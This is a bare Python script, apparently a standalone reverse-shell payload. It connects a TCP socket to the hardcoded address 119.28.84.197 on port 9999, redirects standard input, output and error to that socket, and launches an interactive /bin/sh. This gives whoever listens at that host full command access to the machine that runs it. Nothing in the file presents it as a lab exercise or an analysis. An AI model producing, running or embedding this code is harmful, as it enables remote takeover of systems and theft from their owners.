import socket
import subprocess
import os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("119.28.84.197", 9999))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])
